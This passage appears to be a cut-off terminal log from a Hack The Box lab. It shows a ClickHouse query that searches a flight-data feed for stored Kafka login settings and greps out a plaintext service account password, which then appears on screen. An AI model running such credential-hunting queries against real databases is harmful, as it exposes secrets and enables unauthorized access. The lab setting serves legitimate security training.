"SELECT JSONExtractString(event, 'leg', 'all_fields', 'LegData', 'RemarkFreeText') AS content
 FROM partner_feed.flightleg_json
 WHERE content ILIKE '%PlainLoginModule%'
 ORDER BY ingested DESC LIMIT 1 FORMAT TSVRaw" "$DB" \
| grep -E 'username|password|user_'
  user_svc_infra="Ny2hdpme$bwT3";
                                                                                                                    
┌──(clearlotus㉿kali)-[~/htb/stream]
└─$ Ny2hdpme$bwT3                     

```


